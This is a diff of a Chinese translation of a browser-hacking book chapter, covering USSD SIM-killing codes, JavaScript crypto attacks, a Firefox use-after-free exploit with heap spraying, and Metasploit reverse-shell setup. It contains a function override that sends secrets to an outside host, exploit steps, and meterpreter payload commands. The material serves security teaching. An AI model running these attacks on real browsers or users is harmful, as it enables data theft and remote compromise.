-*   在二维码中嵌入 tel:// USSD 地址。
+观察之前讨论的 USSD 代码 `*#06#`，这种问题的影响可能被视为微不足道。如果你能导致 IMEI 代码在目标手机上显示，这有什么意义呢？问题在于 Borgaonkar 指出的一个问题：某些 USSD 代码可以用于尝试输入 SIM 码。
 
-*   在 NFC 标签中嵌入 tel:// USSD 地址。
-
-观察之前讨论的 USSD 代码 *#06#，这种问题的影响可能被视为微不足道。如果你能导致 IMEI 代码在目标手机上显示，这有什么意义呢？问题在于 Borgaonkar 指出的一个问题：某些 USSD 代码可以用于尝试输入 SIM 码。
-
-在许多情况下，如果错误输入 SIM 码三次，SIM 将被锁定，直到输入 PIN Unlocked Key (PUK) 码才能解锁。基于此攻击，如果输入无效的 PUK 码 10 次，SIM 卡本身将被失效，从而不可用。利用此漏洞意味着目标用户需要自费更换新 SIM 卡，并且在新 SIM 卡安装前，其手机将无法使用。
+在许多情况下，如果错误输入 SIM 码三次，SIM 将被锁定，直到输入 PIN Unlocked Key `PUK` 码才能解锁。基于此攻击，如果输入无效的 PUK 码 10 次，SIM 卡本身将被失效，从而不可用。利用此漏洞意味着目标用户需要自费更换新 SIM 卡，并且在新 SIM 卡安装前，其手机将无法使用。
 
 Borgaonkar 还展示了另一个 USSD 代码，该代码会影响特定 Samsung 手机，并触发设备的恢复出厂设置。完整的 USSD 代码列表请参阅 XDA Developers 论坛：[`forum.xda-developers.com/showthread.php?t=1953506`](http://forum.xda-developers.com/showthread.php?t=1953506)
-
-
 
 -   [不安全的方案处理的影响始终是一个持续的问题，因为越来越多的应用提供新的自定义 URI 处理规则和方法。文中讨论的例子只是可用的 URI 方案中的少数几种。你可能会惊讶地发现，W3C 列出了 150 多种正在 Internet 上使用的不同方案。显然，你拥有巨大的 URI 方案攻击面可以进行探索。
 
@@ -6843,13 +6897,13 @@ Borgaonkar 还展示了另一个 USSD 代码，该代码会影响特定 Samsung 
 
 尽管本章主要讨论浏览器内的漏洞利用，但你不能真的讨论浏览器而不提及 JavaScript。JavaScript 在浏览器中的演变是时代变化的一个良好例子。
 
-截至 Firefox 版本 23，禁用 JavaScript 的选项已被移除（但仍可通过 `javascript.enabled` 标志在 about:config 中启用）。现在普通使用 Firefox 的用户（未安装 NoScript 扩展）别无选择，只能启用 JavaScript。JavaScript 与浏览器之间的界限日益模糊。
+截至 Firefox 版本 23，禁用 JavaScript 的选项已被移除（但仍可通过 `javascript.enabled` 标志在 `about:config` 中启用）。现在普通使用 Firefox 的用户（未安装 NoScript 扩展）别无选择，只能启用 JavaScript。JavaScript 与浏览器之间的界限日益模糊。
 
 因此，浏览器各类攻击中 JavaScript 的重要性难以高估。接下来的章节你将探讨一些利用 JavaScript 自身的方法。
 
 ## 攻击 JavaScript 中的加密
 
-Web 应用越来越多地在客户端实现功能，旨在通过浏览器和 JavaScript 创建强大的应用。这意味着敏感功能从服务器端移动到浏览器已不再罕见。随着 HTML5、WebSocket 协议和其他现代浏览器技术的流行，审视浏览器如何保护数据以及如何将数据传输到后端服务器变得更加重要。
+Web 应用越来越多地在客户端实现功能，旨在通过浏览器和 JavaScript 创建强大的应用。这意味着敏感功能从服务器端移动到浏览器已不再罕见。随着 HTML5、`WebSocket` 协议和其他现代浏览器技术的流行，审视浏览器如何保护数据以及如何将数据传输到后端服务器变得更加重要。
 
 JavaScript 加密的一个挑战是，最终浏览器必须能够访问实际执行加密的所有代码。虽然大量工作已投入到对 JavaScript 进行混淆，但最终代码仍需浏览器可访问。
 
@@ -6867,7 +6921,7 @@ JavaScript 加密的一个挑战是，最终浏览器必须能够访问实际执
 
 ### 揭露密钥
 
-最古老的会话令牌窃取技术之一是利用跨站脚本（XSS）。该攻击注入 JavaScript 代码窃取存储在 Cookie 中的令牌。获取该令牌后，你可以在后续请求中使用它，从而冒充受害者访问应用。
+最古老的会话令牌窃取技术之一是利用跨站脚本 `XSS`。该攻击注入 JavaScript 代码窃取存储在 Cookie 中的令牌。获取该令牌后，你可以在后续请求中使用它，从而冒充受害者访问应用。
 
 如果 Web 应用存在 XSS 漏洞，类似的攻击可以用于窃取敏感密钥。不过，由于密钥不存储在 Cookie 中，不会受到 HttpOnly 保护机制的影响。此外，无需担心超时问题，因为密钥不会失效。一旦你拥有密钥，所有加密数据都能被解密，任何数据都能被签名。
 
@@ -6887,12 +6941,14 @@ Vladimir Vorontsov 正是这样做的。他发现了一家远程银行系统，�
 
 如果对伪造签名已经不满足，几乎所有 JavaScript 对象都可以在作用域的控制下覆盖其函数。这意味着加载到 DOM 的任何脚本都可以覆盖执行加密的函数。
 
-下面是一个使用 Stanford JavaScript Crypto Library（sjcl）演示如何覆盖函数的例子。打开 JavaScript 控制台并加载库的代码：
+下面是一个使用 Stanford JavaScript Crypto Library `sjcl` 演示如何覆盖函数的例子。打开 JavaScript 控制台并加载库的代码：
 
 ```
 var sjcl_lib = document.createElement('script');
+
 sjcl_lib.src = 
   "https://raw.github.com/bitwiseshiftleft/sjcl/master/sjcl.js";
+
 document.getElementsByTagName('head')[0].appendChild(sjcl_lib);
 ```
 
@@ -6902,7 +6958,7 @@ document.getElementsByTagName('head')[0].appendChild(sjcl_lib);
 sjcl.encrypt("password", "secret")
 ```
 
-返回的数据结构包含密文（ct）以及加密过程中使用的其他参数。想不想拦截这个过程并窃取秘密？你可以做到。
+返回的数据结构包含密文 `ct` 以及加密过程中使用的其他参数。想不想拦截这个过程并窃取秘密？你可以做到。
 
 如果 Web 应用存在 XSS 漏洞，就可以覆盖加密函数。记住 XSS 是互联网上最常见的漏洞之一，几乎所有应用都曾遭遇过。
 
@@ -6918,20 +6974,18 @@ sjcl.encrypt = function (password, plaintext, params, rp) {
   document.head.appendChild(img);
   return chained_encrypt(password, plaintext, params, rp)
 }
-
 sjcl.encrypt("password", "secret")
-
-
+```
 
 这段代码将加密函数链接起来，使其仍然被调用。应用程序应感知到其操作方式没有任何差异。重要的是，在函数链中插入的新链接会在数据加密之前窃取秘密数据。随后，它会透明地将其发送到 `http://browserhacker.com` 以安全存储，然后再返回到原始程序流程。
 
 ## JavaScript 和堆利用
 
-本节讨论现代浏览器的低级利用技术。本书不会深入探讨这些方法，但需要提供对绕过浏览器安全控制的技术的基本了解。现在系好安全帽，我们将深入探讨内存管理和 Use After Free (UAF) 利用的复杂性。
+本节讨论现代浏览器的低级利用技术。本书不会深入探讨这些方法，但需要提供对绕过浏览器安全控制的技术的基本了解。现在系好安全帽，我们将深入探讨内存管理和 Use After Free `UAF` 利用的复杂性。
 
 ### 内存管理
 
-应用程序使用的内存由底层操作系统管理。也就是说，应用程序并不直接访问物理内存。相反，操作系统使用虚拟内存的概念来强制执行进程之间的内存隔离，使得每个进程都似乎拥有完整的线性地址空间。每个进程都有用于存储和操作其数据的独立内存区域。这块内存主要分为堆（heap）、栈（stack）以及进程特定的模块和库。栈主要用于存储进程中函数的局部变量（以及其他数据），以及执行特定的元数据，如过程链接信息、函数帧、溢出寄存器等。堆用于存储进程在运行时动态分配的数据。所有现代应用都广泛使用动态内存分配或管理，因为合理使用可以提升性能。
+应用程序使用的内存由底层操作系统管理。也就是说，应用程序并不直接访问物理内存。相反，操作系统使用虚拟内存的概念来强制执行进程之间的内存隔离，使得每个进程都似乎拥有完整的线性地址空间。每个进程都有用于存储和操作其数据的独立内存区域。这块内存主要分为堆 `heap`、栈 `stack` 以及进程特定的模块和库。栈主要用于存储进程中函数的局部变量（以及其他数据），以及执行特定的元数据，如过程链接信息、函数帧、溢出寄存器等。堆用于存储进程在运行时动态分配的数据。所有现代应用都广泛使用动态内存分配或管理，因为合理使用可以提升性能。
 
 浏览器利用修改内存的方式，使执行流向攻击者有利。与安全行业的大多数领域一样，内存管理中的防御措施（如 ASLR、DEP、SafeSEH、堆 Cookie）与利用技术之间形成了一场军备竞赛。
 
@@ -6939,43 +6993,43 @@ sjcl.encrypt("password", "secret")
 
 ### Firefox 与 jemalloc
 
-内存管理器（分配器）负责管理堆所分配的虚拟内存，因此也被称为堆管理器或分配器。操作系统提供的内存管理器向所有应用程序公开，通过 malloc 或其他系统等效函数。然而，大型且复杂的应用程序（如浏览器）通常在操作系统的 malloc 之上实现自己的内存管理器。具体来说，这些应用使用 malloc 向操作系统请求大块内存，然后使用自己的内存管理实现来管理这些内存。这样做是为了获得更好的性能，因为应用程序比通用的操作系统分配器更清楚其动态内存需求。
+内存管理器（分配器）负责管理堆所分配的虚拟内存，因此也被称为堆管理器或分配器。操作系统提供的内存管理器向所有应用程序公开，通过 `malloc` 或其他系统等效函数。然而，大型且复杂的应用程序（如浏览器）通常在操作系统的 `malloc` 之上实现自己的内存管理器。具体来说，这些应用使用 `malloc` 向操作系统请求大块内存，然后使用自己的内存管理实现来管理这些内存。这样做是为了获得更好的性能，因为应用程序比通用的操作系统分配器更清楚其动态内存需求。
 
-jemalloc 是一种这样的内存分配器实现。jemalloc 最初于 2005 年诞生，随后进入 FreeBSD。相较于传统的 malloc 方法，jemalloc 在并发和可扩展性性能方面有所提升，这得益于其对数据检索方式的优化。因此，jemalloc 被广泛用于著名的项目，包括 Firefox。
+`jemalloc` 是一种这样的内存分配器实现。`jemalloc` 最初于 2005 年诞生，随后进入 FreeBSD。相较于传统的 `malloc` 方法，`jemalloc` 在并发和可扩展性性能方面有所提升，这得益于其对数据检索方式的优化。因此，`jemalloc` 被广泛用于著名的项目，包括 Firefox。
 
-Firefox 在所有支持平台（包括 Windows、Linux、OS X 和 Android）上都使用 jemalloc 进行动态内存管理。这意味着 jemalloc 堆用于内存分配，攻击者需要了解如何有利地影响它。
+Firefox 在所有支持平台（包括 Windows、Linux、OS X 和 Android）上都使用 `jemalloc` 进行动态内存管理。这意味着 `jemalloc` 堆用于内存分配，攻击者需要了解如何有利地影响它。
 
-基于局部性原理 —  — 该原理指出，物体受其周围环境的影响，jemalloc 会尽力将内存分配放置在相互靠近的位置。具体而言，jemalloc 将内存划分为固定大小的块。在 Firefox 的情况下，这些块大小为 1MB。jemalloc 使用这些块来存储所有其他数据结构以及用户请求的内存。为减轻线程之间锁竞争，jemalloc 使用 arenas 来管理块。然而，Firefox 默认只有一个硬编码的 arena。
+基于局部性原理 —  — 该原理指出，物体受其周围环境的影响，`jemalloc` 会尽力将内存分配放置在相互靠近的位置。具体而言，`jemalloc` 将内存划分为固定大小的块。在 Firefox 的情况下，这些块大小为 1MB。`jemalloc` 使用这些块来存储所有其他数据结构以及用户请求的内存。为减轻线程之间锁竞争，`jemalloc` 使用 `arenas` 来管理块。然而，Firefox 默认只有一个硬编码的 `arena`。
 
-块进一步划分为 runs，负责处理 up to 2,048 字节的请求和分配。每个 run 跟踪这些大小的空闲和已用区域。Region 是用户分配（例如 malloc 调用）时返回的堆项。每个 run 关联一个 bin，bin 负责存储具有空闲区域的 run 树结构。每个 bin 关联一个大小类，管理该大小类的区域。这可以在 Figure 6-27 中可视化。
+块进一步划分为 `runs`，负责处理 up to 2,048 字节的请求和分配。每个 `run` 跟踪这些大小的空闲和已用区域。`Region` 是用户分配（例如 `malloc` 调用）时返回的堆项。每个 `run` 关联一个 `bin`，`bin` 负责存储具有空闲区域的 `run` 树结构。每个 `bin` 关联一个大小类，管理该大小类的区域。这可以在 Figure 6-27 中可视化。
 
-start figure 
+start figure
 
 **Figure 6-27:** Architecture of jemalloc
 
 ![c06f027.tif](img/c06f027.png)
 
-end figure 
+end figure
 
 ### 为 Firefox 内存做好利用准备
 
-在利用过程中，需要将 jemalloc 的内存排列成有利的状态。这种状态使得内存分配器的行为变得可预测且可靠，从而为你提供优势，可能导致假设的破坏。例如，在正常情况下，应用程序用户对内存管理器在进行动态分配时返回的内存空间一无所知。在开发攻击时，这种信息是必需的，并且必须可靠地可预测。
+在利用过程中，需要将 `jemalloc` 的内存排列成有利的状态。这种状态使得内存分配器的行为变得可预测且可靠，从而为你提供优势，可能导致假设的破坏。例如，在正常情况下，应用程序用户对内存管理器在进行动态分配时返回的内存空间一无所知。在开发攻击时，这种信息是必需的，并且必须可靠地可预测。
 
-为了确认内存已被正确排列，会执行大量的内存分配操作。这种技术称为堆喷（heap spraying）。一旦你对连续的 run 拥有控制权，就需要释放每隔一个区域，从而在你试图操控的大小类中创建空洞或槽。最后一步是触发堆溢出漏洞，如下一节所示。
+为了确认内存已被正确排列，会执行大量的内存分配操作。这种技术称为堆喷 `heap spraying`。一旦你对连续的 `run` 拥有控制权，就需要释放每隔一个区域，从而在你试图操控的大小类中创建空洞或槽。最后一步是触发堆溢出漏洞，如下一节所示。
 
 此方法大幅提升了对内存布局的控制力，并显著提高了利用成功的可靠性。
 
 ### Firefox 示例
 
-2013 年初，Michal Luczaj 向 ZeroDay Initiative 报告了一种 Firefox 漏洞。该漏洞与 DOM 的 XMLSerializer 函数的滥用有关，可导致应用程序崩溃。这正是由于一个文档不完整且仅限 Firefox 的函数造成的。
+2013 年初，Michal Luczaj 向 ZeroDay Initiative 报告了一种 Firefox 漏洞。该漏洞与 DOM 的 `XMLSerializer` 函数的滥用有关，可导致应用程序崩溃。这正是由于一个文档不完整且仅限 Firefox 的函数造成的。
+
+
 
 遗憾的是，该函数缺乏足够的检查来确定何时被调用，因此存在漏洞。Patroklos Argyroudis 和 Chariton Karamitas 进行了进一步研究，发现了该漏洞的更多细节以及它如何导致任意代码执行。
 
-发现的缺陷是 XMLSerializer 对象的 Use After Free (UAF) 漏洞。在 UAF 漏洞中，已分配的堆区域被其他对象引用。随后该区域被释放，但由于遗漏清理操作等原因，仍有引用该区域的对象继续存在，形成悬挂引用。如果你能够控制已释放的区域（例如通过堆喷），就可以通过悬挂引用实现任意代码执行。
+发现的缺陷是 `XMLSerializer` 对象的 Use After Free (`UAF`) 漏洞。在 `UAF` 漏洞中，已分配的堆区域被其他对象引用。随后该区域被释放，但由于遗漏清理操作等原因，仍有引用该区域的对象继续存在，形成悬挂引用。如果你能够控制已释放的区域（例如通过堆喷），就可以通过悬挂引用实现任意代码执行。
 
-利用 UAF XMLSerializer 漏洞需要多个步骤。第一阶段是反复分配大量字符串，直到堆扩展到 JavaScript 攻击中硬编码的高地址（假设该地址为 `0x117012000`）。
-
-
+利用 `UAF` `XMLSerializer` 漏洞需要多个步骤。第一阶段是反复分配大量字符串，直到堆扩展到 JavaScript 攻击中硬编码的高地址（假设该地址为 `0x117012000`）。
 
 JavaScript 代码片段如下：
 
@@ -7034,9 +7088,9 @@ start figure
 
 end figure 
 
-由于漏洞的特性，JavaScript 利用代码中的硬编码地址最终会进入 `rax` 寄存器，目标进程会因漏洞而执行 `call \*0x5f8($rax)`。由于 `rax` 的值可由攻击者通过 JavaScript 利用代码控制，前面的指令会将 Firefox 的执行流向攻击者控制的地址。堆喷 carefully 构造，使得地址 `0x117012000 + 0x5f8` 处的值为 `0x4142434445464748`，从而证明了对 Firefox 执行流的控制权。
+由于漏洞的特性，JavaScript 利用代码中的硬编码地址最终会进入 `rax` 寄存器，目标进程会因漏洞而执行 `call *0x5f8($rax)`。由于 `rax` 的值可由攻击者通过 JavaScript 利用代码控制，前面的指令会将 Firefox 的执行流向攻击者控制的地址。堆喷 carefully 构造，使得地址 `0x117012000 + 0x5f8` 处的值为 `0x4142434445464748`，从而证明了对 Firefox 执行流的控制权。
 
-在 exploit 的第二阶段，JavaScript 再次对堆进行 128 字节字符串的堆喷。当请求多个分配时，jemalloc 会尝试在内存中将它们连续放置。随后，`delete` 用于释放每个分配的另一半，导致内存状态如 Figure 6-29 所示的模式。
+在 exploit 的第二阶段，JavaScript 再次对堆进行 128 字节字符串的堆喷。当请求多个分配时，`jemalloc` 会尝试在内存中将它们连续放置。随后，`delete` 用于释放每个分配的另一半，导致内存状态如 Figure 6-29 所示的模式。
 
 start figure 
 
@@ -7046,11 +7100,11 @@ start figure
 
 end figure 
 
-标记为 “Free” 的区域实际上并未真正释放，它们仅被标记为空闲，但并未真正释放。Firefox 的 JavaScript 引擎（SpiderMonkey）会在认为有必要时才回收它们。要强制其释放，需要触发 SpiderMonkey 的垃圾收集器（GC）。这可以通过导致堆分配激增来实现，从而迫使垃圾收集器清理未使用的区域。
+标记为 “Free” 的区域实际上并未真正释放，它们仅被标记为空闲，但并未真正释放。Firefox 的 JavaScript 引擎（`SpiderMonkey`）会在认为有必要时才回收它们。要强制其释放，需要触发 `SpiderMonkey` 的垃圾收集器（`GC`）。这可以通过导致堆分配激增来实现，从而迫使垃圾收集器清理未使用的区域。
 
 所有这些操作的结果是，堆被精心准备好在前一阶段创建的 128 字节孔隙之间放置受控的堆区域。这样，后续的 128 字节分配请求大概率会落在刚刚创建的孔隙中。
 
-第三阶段的 exploit 包括动态创建多个 HTML 元素，这些元素由 `HTMLUnknownElement` C++ 类（128 字节）支撑。C++ 类为所有 HTML 元素、JavaScript 对象以及其他浏览器构造提供支持，因为 Firefox、其 HTML 渲染器以及 JavaScript 引擎均实现于 C++。具有虚函数的 C++ 类也拥有虚函数表（vtable），其中包含指向对应方法的函数指针。这一点对你很重要，因为如果你能够腐蚀虚函数表，就可以将浏览器的执行流向你自己选择的代码转移。
+第三阶段的 exploit 包括动态创建多个 HTML 元素，这些元素由 `HTMLUnknownElement` C++ 类（128 字节）支撑。C++ 类为所有 HTML 元素、JavaScript 对象以及其他浏览器构造提供支持，因为 Firefox、其 HTML 渲染器以及 JavaScript 引擎均实现于 C++。具有虚函数的 C++ 类也拥有虚函数表（`vtable`），其中包含指向对应方法的函数指针。这一点对你很重要，因为如果你能够腐蚀虚函数表，就可以将浏览器的执行流向你自己选择的代码转移。
 
 如果一切按计划进行，这些区域将填充在前一阶段创建的孔隙中。确保并非所有孔隙都被占用是很重要的。
 
@@ -7102,7 +7156,7 @@ end figure
 
 这个漏洞的一个有趣的回应来自开发者在 Bugzilla 报告中的评论：“Argh, we expose serializeToStream to web :/”。这很可能会引导安全研究人员去寻找产品中开发者未意图包含的其他漏洞。
 
-虽然这里提供的示例代码本身不具备自行执行的能力，但可以通过多种方式将 64 位指针（RIP）的值设置为指向内存中的其他代码，从而实现代码执行。注入的代码会根据被利用的平台而异。这时工具如 Metasploit 非常理想，因为它提供了为多种平台定制 exploit 的能力。你可以在 [`browserhacker.com`](https://browserhacker.com) 找到完整的 Proof of Concept 以及相关代码。
+虽然这里提供的示例代码本身不具备自行执行的能力，但可以通过多种方式将 64 位指针（`RIP`）的值设置为指向内存中的其他代码，从而实现代码执行。注入的代码会根据被利用的平台而异。这时工具如 Metasploit 非常理想，因为它提供了为多种平台定制 exploit 的能力。你可以在 [`browserhacker.com`](https://browserhacker.com) 找到完整的 Proof of Concept 以及相关代码。
 
 # 使用 Metasploit 获得 Shell
 
@@ -7110,40 +7164,24 @@ end figure
 
 对于 exploit 开发者，Metasploit 简化了创建可跨平台和系统使用的 exploit 的工作。框架提供了开发者所需的大部分功能，包括随机化设施、多种环境和系统的预装 shell、VNC 连接处理以及其他 payload 类型，这些都是 exploit 可能需要的。
 
-
-
-
--   [Metasploit 用户界面简化了执行漏洞利用的过程，为测试自己的系统提供了更简便的方法。无论用途如何，所有信息均免费提供，使各级人员都能了解漏洞是什么、影响是什么、工作原理、如何检测，以及拥有一个易于重复的测试位置。]
-
--   [Metasploit 提供用于发现和枚举的辅助模块，可让你：]
-
-    -   找到易受影响的机器
-
-    -   确定正在运行的服务
-
-    -   枚举服务
-
-    -   获取系统中协议的具体信息
-
-    这些功能帮助你发现网络上的资源以及已发现系统的潜在脆弱性。尽管 Metasploit 具备发现功能，但它并不是一个专门的漏洞扫描器。不过，它可以从其他工具的漏洞扫描结果中消费数据，并将 CVE 与漏洞利用模块进行关联，从而轻松判断哪些模块可利用哪些漏洞。
-
--   [虽然上述功能强大，但你的目标是利用系统。下面的章节将介绍如何使用 Metasploit 对运行 Internet Explorer 8 的 Windows 7 系统进行浏览器攻击，最终在远程系统上获取 shell。]
+- [Metasploit 用户界面简化了执行漏洞利用的过程，为测试自己的系统提供了更简便的方法。无论用途如何，所有信息均免费提供，使各级人员都能了解漏洞是什么、影响是什么、工作原理、如何检测，以及拥有一个易于重复的测试位置。]
+- [Metasploit 提供用于发现和枚举的辅助模块，可让你：]
+  - 找到易受影响的机器
+  - 确定正在运行的服务
+  - 枚举服务
+  - 获取系统中协议的具体信息
+这些功能帮助你发现网络上的资源以及已发现系统的潜在脆弱性。尽管 Metasploit 具备发现功能，但它并不是一个专门的漏洞扫描器。不过，它可以从其他工具的漏洞扫描结果中消费数据，并将 CVE 与漏洞利用模块进行关联，从而轻松判断哪些模块可利用哪些漏洞。
+- [虽然上述功能强大，但你的目标是利用系统。下面的章节将介绍如何使用 Metasploit 对运行 Internet Explorer 8 的 Windows 7 系统进行浏览器攻击，最终在远程系统上获取 shell。]
 
 ## 开始使用 Metasploit
 
--   [如果你无法轻松获取 Metasploit，Kali Linux 发行版可从 [`www.kali.org/`](http://www.kali.org/) 获取。Kali 是一款标准的渗透测试发行版，默认已包含 Metasploit。Metasploit 几乎可以在任何运行 Ruby 的系统上运行，因此如果你有 Ruby 访问权限，就可以从 [`www.metasploit.com/`](http://www.metasploit.com/) 获取 Metasploit。]
-
--   [首先，使用命令 `msfconsole` 启动 Metasploit。输出应显示启动画面后的 `msf >` 提示符。Metasploit 加载完成后，你可以执行以下操作：]
-
-    -   使用模块
-
-    -   获取模块信息
-
-    -   搜索模块
-
-    -   查看模块信息
-
--   [要搜索所有针对 IE 8 的模块，输入 `search IE8`，如下所示：]
+- [如果你无法轻松获取 Metasploit，Kali Linux 发行版可从 [`www.kali.org/`](http://www.kali.org/) 获取。Kali 是一款标准的渗透测试发行版，默认已包含 Metasploit。Metasploit 几乎可以在任何运行 Ruby 的系统上运行，因此如果你有 Ruby 访问权限，就可以从 [`www.metasploit.com/`](http://www.metasploit.com/) 获取 Metasploit。]
+- [首先，使用命令 `msfconsole` 启动 Metasploit。输出应显示启动画面后的 `msf >` 提示符。Metasploit 加载完成后，你可以执行以下操作：]
+  - 使用模块
+  - 获取模块信息
+  - 搜索模块
+  - 查看模块信息
+- [要搜索所有针对 IE 8 的模块，输入 `search IE8`，如下所示：]
 
 ```
 msf > search IE8
@@ -7168,7 +7206,7 @@ Matching Modules
  <snipped for brevity>
 ```
 
--   [要获取特定模块的详细信息，输入 `info exploit/windows/browser/ie_cgenericelement_uaf`，示例如下：]
+- [要获取特定模块的详细信息，输入 `info exploit/windows/browser/ie_cgenericelement_uaf`，示例如下：]
 
 ```
 msf> info exploit/windows/browser/ie_cgenericelement_uaf
@@ -7184,9 +7222,8 @@ msf> info exploit/windows/browser/ie_cgenericelement_uaf
  <snipped for brevity>
 ```
 
--   [模块按其上下文排序，例如此处为针对浏览器的 Windows  exploit，名称为 ie_cgenericelement_uaf。]
-
--   [在浏览器已被 BeEF Hook 且你已完成浏览器指纹识别后，第一步是选择最适合目标的 Metasploit exploit。本例中，目标为运行 IE 8 的 Windows 7 系统。Hook 后，可在 BeEF 的 Details 标签页中查看自动识别的浏览器及操作系统信息（如图 6-30 所示）。]
+- [模块按其上下文排序，例如此处为针对浏览器的 Windows exploit，名称为 `ie_cgenericelement_uaf`。]
+- [在浏览器已被 BeEF Hook 且你已完成浏览器指纹识别后，第一步是选择最适合目标的 Metasploit exploit。本例中，目标为运行 IE 8 的 Windows 7 系统。Hook 后，可在 BeEF 的 Details 标签页中查看自动识别的浏览器及操作系统信息（如图 6-30 所示）。]
 
  start figure 
 
@@ -7196,39 +7233,35 @@ msf> info exploit/windows/browser/ie_cgenericelement_uaf
 
  end figure 
 
--   [可以看到浏览器被识别为运行在 Windows 7 32 位架构上的 IE 8。通过浏览 Category 标签，可看到 Flash 和 Java 已安装。这些信息在 BeEF Hook 初始化时自动获取。BeEF 通过 Java（如果未检测到 Java，则需采取其他措施）来分析 Hooked 浏览器的底层操作系统信息。]
-
--   [首选方式是选择针对目标平台的近期漏洞并针对其进行利用，而不是直接对系统发起全面攻击，从而降低被检测的风险。BeEF 使用流量灯系统标记哪些 exploit 更可能成功：]
-
-    -   Green 表示该模块应能在不通知用户的情况下成功
-
-    -   Yellow 表示该模块可能会触发用户警报
-
-    -   Red 表示该 exploit 不太可能成功
-
-    -   Gray 表示该 exploit 尚未在目标配置上验证
+- [可以看到浏览器被识别为运行在 Windows 7 32 位架构上的 IE 8。通过浏览 Category 标签，可看到 Flash 和 Java 已安装。这些信息在 BeEF Hook 初始化时自动获取。BeEF 通过 Java（如果未检测到 Java，则需采取其他措施）来分析 Hooked 浏览器的底层操作系统信息。]
+- [首选方式是选择针对目标平台的近期漏洞并针对其进行利用，而不是直接对系统发起全面攻击，从而降低被检测的风险。BeEF 使用流量灯系统标记哪些 exploit 更可能成功：]
+  - Green 表示该模块应能在不通知用户的情况下成功
+  - Yellow 表示该模块可能会触发用户警报
+  - Red 表示该 exploit 不太可能成功
+  - Gray 表示该 exploit 尚未在目标配置上验证
 
 ## 执行单个 exploit
 
--   [在确定要使用的 exploit 后，下一步是启动 Metasploit 的 Web 服务器，并通过 BeEF 将目标浏览器指向该监听端口。]
+- [在确定要使用的 exploit 后，下一步是启动 Metasploit 的 Web 服务器，并通过 BeEF 将目标浏览器指向该监听端口。]
+- [针对浏览器的 exploit，Metasploit 会启动一个 Web 服务器以接受浏览器请求。该服务器支持多个端点（URI Path），因此同一 Metasploit 实例可在单一网络端口上提供多个 exploit，无需为每个 exploit 单独启动服务器。选择端口时需考虑目标网络的代理或防火墙过滤情况：]
+  - 若目标流量可能经过代理或受非标准端口过滤限制，建议使用 80 或 443 端口，因为这两个端口通常能够绕过 egress filtering。
+  - 若存在基于代理的 AV 检测，80 端口流量可能被阻断，而 443 端口可能直接绕过代理。
 
--   [针对浏览器的 exploit，Metasploit 会启动一个 Web 服务器以接受浏览器请求。该服务器支持多个端点（URI Path），因此同一 Metasploit 实例可在单一网络端口上提供多个 exploit，无需为每个 exploit 单独启动服务器。选择端口时需考虑目标网络的代理或防火墙过滤情况：]
 
-    -   若目标流量可能经过代理或受非标准端口过滤限制，建议使用 80 或 443 端口，因为这两个端口通常能够绕过 egress filtering。
 
-    -   若存在基于代理的 AV 检测，80 端口流量可能被阻断，而 443 端口可能直接绕过代理。
+## 在 msfconsole 中启用模块并查看选项
 
--   [在 msfconsole 中，启用 `windows/browser/ie_cgenericelement_uaf` 并执行 `show options` 可查看需配置的选项（如图 6-31 所示）。]
+在 `msfconsole` 中，启用 `windows/browser/ie_cgenericelement_uaf` 并执行 `show options` 可查看需配置的选项（如图 6-31 所示）。
 
- start figure 
+start figure
 
 **Figure 6-31:** Meterpreter console
 
 ![c06f031.tif](img/c06f031.png)
 
- end figure 
+end figure
 
--   [若需指定服务器绑定的 IP 地址，需修改 `SRVHOST` 变量；否则只需设置 `SRVPORT`、`URI PATH` 和 `payload` 变量。示例命令如下：]
+若需指定服务器绑定的 IP 地址，需修改 `SRVHOST` 变量；否则只需设置 `SRVPORT`、`URI PATH` 和 `payload` 变量。示例命令如下：
 
 ```
 set URIPATH /single
@@ -7239,22 +7272,19 @@ set payload windows/meterpreter/reverse_tcp
 show options
 ```
 
+将路径设置为 `/single` 并让服务器监听 80 端口。您有多种负载选项，可通过输入 `show payloads` 查看。其中常用的负载之一是 meterpreter 负载。该负载是渗透测试专用的专用 shell，具有许多额外功能以便在后期利用时使用。Meterpreter 有两个主要子选项：绑定 shell 和反向 shell。
 
+绑定 shell 在目标系统上创建一个监听器。一旦监听器启动，选择的 shell 类型将被附加到端口上。当您访问该端口时，连接会建立，您将获得 shell 访问。
 
+此过程会带来两个潜在问题。第一个问题是主机位于 NAT 设备或防火墙后面。在这种情况下，即使端口在监听，您也无法连接到远程端口。
 
--   [将路径设置为 `/single` 并让服务器监听 80 端口。您有多种负载选项，可通过输入 `show payloads` 查看。其中常用的负载之一是 meterpreter 负载。该负载是渗透测试专用的专用 shell，具有许多额外功能以便在后期利用时使用。Meterpreter 有两个主要子选项：绑定 shell 和反向 shell。
+第二个问题是端口打开后，必须是您第一个连接到它的攻击者。理想情况下，您是最先到达该端口的人，但如果有人先到，您就为别人提供了 shell。虽然这听起来不太可能，但内部网络的定期漏洞扫描过程可能会先到达它。虽然漏洞扫描工具不知道如何使用该 shell，但它会连接并断开连接，导致您的 exploit 白费。
 
--   绑定 shell 在目标系统上创建一个监听器。一旦监听器启动，选择的 shell 类型将被附加到端口上。当您访问该端口时，连接会建立，您将获得 shell 访问。
+另一种可用的 shell 是反向 shell。反向 shell 也有自己的挑战。反向 shell 设计用于连接回您，前提是您的 IP 地址可路由。位于 NAT 和代理后面的主机更容易向 Internet 上的主机发起连接，这正是反向 shell 设计的主要场景。
 
--   此过程会带来两个潜在问题。第一个问题是主机位于 NAT 设备或防火墙后面。在这种情况下，即使端口在监听，您也无法连接到远程端口。
+当代理是网络唯一出站点时，反向 shell 可能会带来挑战。幸运的是，Metasploit 有两种专为代理设计的负载类型：http 和 https meterpreter 负载（通过目标的代理服务器进行通信）。
 
--   第二个问题是端口打开后，必须是您第一个连接到它的攻击者。理想情况下，您是最先到达该端口的人，但如果有人先到，您就为别人提供了 shell。虽然这听起来不太可能，但内部网络的定期漏洞扫描过程可能会先到达它。虽然漏洞扫描工具不知道如何使用该 shell，但它会连接并断开连接，导致您的 exploit 白费。
-
--   另一种可用的 shell 是反向 shell。反向 shell 也有自己的挑战。反向 shell 设计用于连接回您，前提是您的 IP 地址可路由。位于 NAT 和代理后面的主机更容易向 Internet 上的主机发起连接，这正是反向 shell 设计的主要场景。
-
--   当代理是网络唯一出站点时，反向 shell 可能会带来挑战。幸运的是，Metasploit 有两种专为代理设计的负载类型：http 和 https meterpreter 负载（通过目标的代理服务器进行通信）。
-
--   基于此信息，您需要选择最适合您的方案。以下示例使用直接连接到主机的方式，因此采用反向 shell：
+基于此信息，您需要选择最适合您的方案。以下示例使用直接连接到主机的方式，因此采用反向 shell：
